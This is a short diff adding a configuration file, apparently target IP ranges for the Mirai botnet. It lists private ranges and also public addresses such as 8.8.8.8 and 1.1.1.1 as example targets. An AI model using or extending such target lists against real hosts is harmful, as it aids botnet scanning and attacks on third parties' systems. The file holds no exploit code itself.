@@ -1,0 +1,13 @@
+# Custom IP ranges for Mirai bot
+# Format: start_ip - end_ip,
+# Each line should contain one IP range
+
+# Example ranges:
+192.168.1.10 - 192.168.1.20, 
+10.0.0.4 - 10.0.0.15,
+172.16.0.1 - 172.16.0.100,
+8.8.8.8 - 8.8.8.8,
+1.1.1.1 - 1.1.1.10,
+
+# Add more ranges below:
+# 203.0.113.1 - 203.0.113.254,
